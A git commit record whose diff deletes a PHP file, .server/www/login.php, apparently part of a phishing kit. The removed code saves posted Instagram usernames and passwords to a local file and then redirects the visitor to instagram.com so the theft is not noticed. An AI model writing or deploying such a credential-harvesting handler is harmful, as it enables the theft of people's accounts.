2522b18507f035c4fd4e907eb2a35eb46e8a2d30
Manuel Dios <mdios@utem.cl>
2025-01-20 14:55:47 -0300

    ahi si

--- .server/www/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("usernames.dat", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://instagram.com');
-exit();
-?>
